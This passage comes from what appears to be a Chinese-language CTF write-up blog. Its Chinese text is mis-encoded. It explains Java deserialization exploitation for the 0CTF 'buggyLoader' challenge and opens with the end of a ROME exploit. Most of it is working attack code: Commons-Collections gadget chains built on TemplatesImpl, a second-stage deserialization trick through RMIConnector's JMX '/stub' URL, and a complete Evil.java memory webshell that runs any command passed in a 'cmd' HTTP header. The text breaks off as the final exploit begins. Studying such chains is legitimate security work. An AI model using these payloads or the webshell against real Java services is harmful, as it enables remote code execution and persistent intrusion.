<span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(hashMap);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] bytes1 = byteArrayOutputStream.toByteArray();</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> Exp.base64Encode(bytes1);</span><br><span class="line">        System.out.println(s);</span><br><span class="line"><span class="comment">//        serialize(hashMap);</span></span><br><span class="line"><span class="comment">//        unseralize(&quot;ser.bin&quot;);</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">base64Encode</span><span class="params">(<span class="type">byte</span>[] bytes)</span> &#123;</span><br><span class="line">        Base64.<span class="type">Encoder</span> <span class="variable">encoder</span> <span class="operator">=</span> Base64.getEncoder();</span><br><span class="line">        <span class="keyword">return</span> encoder.encodeToString(bytes);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getValue</span><span class="params">(Object obj, String name)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">return</span> field.get(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">os</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">        os.writeObject(object);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unseralize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">oi</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fis);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> oi.readObject();</span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œè¿˜æ˜¯ç”¨çš„ä¸Šé¢é‚£ä¸ªæ¶æ„ç±»ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥ç›´æ¥å†™ä¸ªåå¼¹shellçš„æ¶æ„ç±»ï¼Œæ³¨æ„ä¸€ä¸‹ä¼ å‚è§„å®šç”¨jsonå½¢å¼ä¼ </p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images/image/image-20221116192445659.png" alt="image-20221116192445659"></p>]]></content>
      
      
      <categories>
          
          <category> Javaå®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> rome </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>0ctf_buggyLoader</title>
      <link href="/2022/11/03/0ctf_buggyLoader/"/>
      <url>/2022/11/03/0ctf_buggyLoader/</url>
      
        <content type="html"><![CDATA[<h1 id="0ctf-buggyLoader"><a href="#0ctf-buggyLoader" class="headerlink" title="0ctf_buggyLoader"></a>0ctf_buggyLoader</h1><p>è€ƒç‚¹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.äºŒæ¬¡ååºåˆ—åŒ–</span><br><span class="line">2.ä¸å‡ºç½‘åˆ©ç”¨</span><br></pre></td></tr></table></figure><p>å…ˆçœ‹IndexControllerï¼Œåœ¨ä¼ å‚å¤„å¹¶æ²¡æœ‰ä»€ä¹ˆé™åˆ¶ï¼Œéœ€è¦ä¼ å…¥ä¸€ä¸ªåå…­è¿›åˆ¶å­—ç¬¦ä¸²ï¼Œæœ€åå†æ·»åŠ ä¸€ä¸ª<code>SJTU</code>,<code>1896</code>å³å¯ï¼Œå€¼å¾—æ³¨æ„çš„æ˜¯è¿›è¡Œè¾“å…¥æµæ—¶è°ƒç”¨çš„æ˜¯å®ƒè‡ªå®šä¹‰çš„ä¸€ä¸ªåºåˆ—åŒ–å‡½æ•°</p><p><a href="https://imgse.com/i/zQGeA0"><img src="https://s1.ax1x.com/2022/11/21/zQGeA0.png" alt="zQGeA0.png"></a></p><p>è·Ÿè¿›<code>MyObjectInputStream</code></p><p><a href="https://imgse.com/i/zQJDRU"><img src="https://s1.ax1x.com/2022/11/21/zQJDRU.png" alt="zQJDRU.png"></a></p><p>é‡å†™äº†javaåŸç”Ÿçš„<code>ObjectInputStream</code>ç±»ä¸‹çš„ååºåˆ—åŒ–å‡½æ•°</p><p>å¯¹æ¯”ä¸€ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; resolveClass(ObjectStreamClass desc)</span><br><span class="line">    <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> desc.getName();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> Class.forName(name, <span class="literal">false</span>, latestUserDefinedLoader());</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassNotFoundException ex) &#123;</span><br><span class="line">        Class&lt;?&gt; cl = primClasses.get(name);</span><br><span class="line">        <span class="keyword">if</span> (cl != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> cl;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> ex;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åŸç”Ÿçš„ååºåˆ—åŒ–æ“ä½œä½¿ç”¨<code>Class.forName</code>åŠ è½½ç±»ï¼Œè€Œè¿™é‡Œæ”¹å†™æˆäº†ç”¨<code>classloader</code>å»åŠ è½½</p><p>åŒºåˆ«åœ¨å“ªå„¿ï¼Ÿ<code>Class.forName</code>å¯ä»¥åŠ è½½æ•°ç»„ç±»ï¼Œè€Œ<code>classloader</code>ä¸èƒ½è¿›è¡Œæ•°ç»„ç±»çš„åŠ è½½</p><p>é¢˜ç›®ç¯å¢ƒæ˜¯æœ‰cc3.2.1ä¾èµ–çš„ï¼Œcc3.2.1ä¸­å¸¸è§„é“¾éƒ½åˆ©ç”¨åˆ°<code>InvokerTransformer</code>æ•°ç»„ï¼Œåœ¨<a href="https://gh0st.vip/2022/10/19/Shiro550-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">shiro550</a>ä¸­é€šè¿‡æ‹¼æ¥<code>CC3,CC2,CC6</code>æ„é€ å‡ºäº†ä¸€æ¡æ— éœ€<code>InvokerTransformer</code>æ•°ç»„çš„åˆ©ç”¨é“¾ï¼Œå¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">//CC3</span></span><br><span class="line">        TemplatesImpl templatesimpl=<span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        Class c=templatesimpl.getClass();</span><br><span class="line">        Field _nameField=c.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        _nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _nameField.set(templatesimpl,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Field _byteCodesField=c.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        _byteCodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\BadClass\\Calc.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes= &#123;code&#125;;</span><br><span class="line">        _byteCodesField.set(templatesimpl,codes);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//CC2</span></span><br><span class="line">        InvokerTransformer invokerTransformer=<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>,<span class="literal">null</span>,<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//CC6</span></span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap1=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        LazyMap lazyMap= (LazyMap) LazyMap.decorate(hashMap1,<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">        TiedMapEntry tiedMapEntry=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap,templatesimpl);</span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap2=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap2.put(tiedMapEntry,<span class="string">&quot;AAA&quot;</span>);</span><br><span class="line">        lazyMap.remove(templatesimpl);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//åå°„ä¿®æ”¹LazyMapç±»çš„factoryå±æ€§</span></span><br><span class="line">        Class clazz=LazyMap.class;</span><br><span class="line">        Field factoryField= clazz.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        factoryField.set(lazyMap,invokerTransformer);</span><br><span class="line">        </span><br><span class="line">        serialize(hashMap2);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä½†å®é™…ä¸ŠExpé‡Œé¢<code>byte[][] codes= &#123;code&#125;</code>ä¸ºå­—èŠ‚æ•°ç»„ï¼Œåœ¨æœ¬é¢˜ç¯å¢ƒä¸‹ä¹Ÿæ˜¯æ— æ³•åˆ©ç”¨çš„</p><p>è¿™é‡Œå°±æœ‰ä¸¤æ¡æ€è·¯ï¼Œæ‰¾åˆ°å¦ä¸€æ¡ä¸éœ€è¦ç”¨åˆ°æ•°ç»„ç±»çš„åˆ©ç”¨é“¾ï¼Œæˆ–è€…æƒ³åŠæ³•åœ¨ä½¿ç”¨æ•°ç»„ç±»çš„æƒ…å†µä¸‹ç»•è¿‡é™åˆ¶</p><p>å®é™…æƒ…å†µæ˜¯æƒ³è¦å†æ‰¾åˆ°ä¸€æ¡ä¸åˆ©ç”¨æ•°ç»„ç±»çš„é“¾å­å‡ ä¹æ˜¯ä¸å¯èƒ½çš„äº†ï¼Œæ‰€ä»¥åªæœ‰æƒ³åŠæ³•å®ç°ç¬¬äºŒç§æƒ…å†µ</p><h2 id="äºŒæ¬¡ååºåˆ—åŒ–"><a href="#äºŒæ¬¡ååºåˆ—åŒ–" class="headerlink" title="äºŒæ¬¡ååºåˆ—åŒ–"></a>äºŒæ¬¡ååºåˆ—åŒ–</h2><p>é€šè¿‡ä¸€ä¸ªååºåˆ—åŒ–çš„æµæ¥æ–°å»ºä¸€ä¸ªååºåˆ—åŒ–ï¼ŒæŠŠä¸€ä¸ªå—é™çš„ååºåˆ—åŒ–ç»™å˜æˆä¸€ä¸ªä¸å—é™çš„ååºåˆ—åŒ–ï¼Œåœ¨javaä¸­ï¼Œå¯ä»¥é€šè¿‡äºŒæ¬¡ååºåˆ—åŒ–æ¥ç»•è¿‡è¯¸å¤šé™åˆ¶</p><p>å…·ä½“åˆ†æè¯·å‚è€ƒä»¥å‰å†™çš„åšæ–‡</p><p>æœ¬é¢˜çš„çªç ´ç‚¹åœ¨äºæ‰¾åˆ°ä¸€ä¸ªæ— å‚çš„ï¼Œ<code>public</code>çš„ï¼Œç»§æ‰¿<code>serialize</code>æ¥å£(å› ä¸ºä½œä¸ºå…¥å£ç±»ï¼Œæ‰€ä»¥éœ€è¦ç»§æ‰¿åºåˆ—åŒ–æ¥å£)çš„ç±»æ¥ä»£æ›¿<code>newTransformer</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">InvokerTransformer invokerTransformer=<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>,<span class="literal">null</span>,<span class="literal">null</span>);</span><br></pre></td></tr></table></figure><p>æ¨èä¸€ä¸ªå·¥å…·<a href="https://codeql.github.com/">CodeQl</a>ï¼Œå…·ä½“çš„ç”¨æ³•è¿™é‡Œå°±ä¸è¯¦ç»†è®²è§£äº†ï¼Œå¸ˆå‚…ä»¬å¯å‚é˜…å®˜æ–¹æ–‡æ¡£è¿›è¡Œå­¦ä¹ </p><p>æ¥ä¸‹æ¥å°±æ˜¯æ¼«æ¼«å¯»æ‰¾å¯ç”¨ç±»çš„è¿‡ç¨‹äº†</p><p>æœ€ç»ˆæ˜¯æ‰¾åˆ°<code>RMIConnector</code>ç±»è¿›è¡ŒäºŒæ¬¡ååºåˆ—åŒ–æ“ä½œ</p><p><code>RMIConnector</code>ä¸‹çš„<code>findRMIServerJRMP()</code>æ–¹æ³•</p><p><a href="https://imgse.com/i/zQq5hd"><img src="https://s1.ax1x.com/2022/11/21/zQq5hd.png" alt="zQq5hd.png"></a></p><p>å¾€ä¸Šæ‰¾ï¼Œéœ€è¦<code>/stub</code></p><p><a href="https://imgse.com/i/zQqLB8"><img src="https://s1.ax1x.com/2022/11/21/zQqLB8.png" alt="zQqLB8.png"></a></p><p>ç»§ç»­å¾€ä¸Šï¼Œåœ¨è¯¥ç±»<code>connect()</code>æ–¹æ³•ä¸­å‘ç°è°ƒç”¨</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (tracing) logger.trace(<span class="string">&quot;connect&quot;</span>,idstr + <span class="string">&quot; finding stub...&quot;</span>);</span><br><span class="line"><span class="type">RMIServer</span> <span class="variable">stub</span> <span class="operator">=</span> (rmiServer!=<span class="literal">null</span>)?rmiServer:</span><br><span class="line">findRMIServer(jmxServiceURL, usemap);</span><br></pre></td></tr></table></figure><p>è¯¥ç±»çš„æ„é€ å‡½æ•°å®Œç¾ç¬¦åˆè¦æ±‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">RMIConnector</span><span class="params">(JMXServiceURL url, Map&lt;String,?&gt; environment)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>(<span class="literal">null</span>, url, environment);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨å¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">JMXServiceURL</span> <span class="variable">jmxServiceURL</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JMXServiceURL</span>(<span class="string">&quot;service:jmx:rmi://&quot;</span>);</span><br><span class="line">setFieldValue(jmxServiceURL, <span class="string">&quot;urlPath&quot;</span>, <span class="string">&quot;/stub/base64åçš„åºåˆ—åŒ–å­—ç¬¦ä¸²&quot;</span>);</span><br><span class="line"><span class="type">RMIConnector</span> <span class="variable">rmiConnector</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RMIConnector</span>(jmxServiceURL, <span class="literal">null</span>);</span><br></pre></td></tr></table></figure><h2 id="ä¸å‡ºç½‘åˆ©ç”¨"><a href="#ä¸å‡ºç½‘åˆ©ç”¨" class="headerlink" title="ä¸å‡ºç½‘åˆ©ç”¨"></a>ä¸å‡ºç½‘åˆ©ç”¨</h2><p>ç”±äºé¢˜ç›®ä¸å‡ºç½‘ï¼Œæ‰€ä»¥éœ€æ„é€ ç‰¹æ®Šæ¶æ„ç±»æˆ–å†™å†…å­˜é©¬</p><p><strong>Evil.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Evil</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Evil</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader().loadClass(<span class="string">&quot;org.springframework.web.context.request.RequestContextHolder&quot;</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">m</span> <span class="operator">=</span> c.getMethod(<span class="string">&quot;getRequestAttributes&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> m.invoke(<span class="literal">null</span>);</span><br><span class="line">        c = Thread.currentThread().getContextClassLoader().loadClass(<span class="string">&quot;org.springframework.web.context.request.ServletRequestAttributes&quot;</span>);</span><br><span class="line">        m = c.getMethod(<span class="string">&quot;getResponse&quot;</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">m1</span> <span class="operator">=</span> c.getMethod(<span class="string">&quot;getRequest&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">resp</span> <span class="operator">=</span> m.invoke(o);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">req</span> <span class="operator">=</span> m1.invoke(o); <span class="comment">// HttpServletRequest</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">getWriter</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader().loadClass(<span class="string">&quot;javax.servlet.ServletResponse&quot;</span>).getDeclaredMethod(<span class="string">&quot;getWriter&quot;</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">getHeader</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader().loadClass(<span class="string">&quot;javax.servlet.http.HttpServletRequest&quot;</span>).getDeclaredMethod(<span class="string">&quot;getHeader&quot;</span>,String.class);</span><br><span class="line">        getHeader.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        getWriter.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">writer</span> <span class="operator">=</span> getWriter.invoke(resp);</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> (String)getHeader.invoke(req, <span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">        String[] commands = <span class="keyword">new</span> <span class="title class_">String</span>[<span class="number">3</span>];</span><br><span class="line">        <span class="type">String</span> <span class="variable">charsetName</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>).toLowerCase().contains(<span class="string">&quot;window&quot;</span>) ? <span class="string">&quot;GBK&quot;</span>:<span class="string">&quot;UTF-8&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (System.getProperty(<span class="string">&quot;os.name&quot;</span>).toUpperCase().contains(<span class="string">&quot;WIN&quot;</span>)) &#123;</span><br><span class="line">            commands[<span class="number">0</span>] = <span class="string">&quot;cmd&quot;</span>;</span><br><span class="line">            commands[<span class="number">1</span>] = <span class="string">&quot;/c&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            commands[<span class="number">0</span>] = <span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line">            commands[<span class="number">1</span>] = <span class="string">&quot;-c&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        commands[<span class="number">2</span>] = cmd;</span><br><span class="line">        writer.getClass().getDeclaredMethod(<span class="string">&quot;println&quot;</span>, String.class).invoke(writer, <span class="keyword">new</span> <span class="title class_">Scanner</span>(Runtime.getRuntime().exec(commands).getInputStream(),charsetName).useDelimiter(<span class="string">&quot;\\A&quot;</span>).next());</span><br><span class="line">        writer.getClass().getDeclaredMethod(<span class="string">&quot;flush&quot;</span>).invoke(writer);</span><br><span class="line">        writer.getClass().getDeclaredMethod(<span class="string">&quot;close&quot;</span>).invoke(writer);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>éšä¾¿æ‰¾ä¸€æ¡ccé“¾è£…è¿›å»ï¼Œè¿™é‡Œé‡‡ç”¨cc3æ‹¼æ¥cc6ï¼Œå› ä¸ºcc3ä¸­éœ€è¦ç”¨åˆ°<code>sun.reflect.annotation.AnnotationInvocationHandler</code>ï¼Œè€Œè¯¥ç±»åœ¨é«˜ç‰ˆæœ¬jdkä¸­æ˜¯æ²¡æœ‰çš„</p><h2 id="Expæ„é€ "><a href="#Expæ„é€ " class="headerlink" title="Expæ„é€ "></a>Expæ„é€ </h2><p><strong>Exp1</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.yxxx.javasec.deserialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> 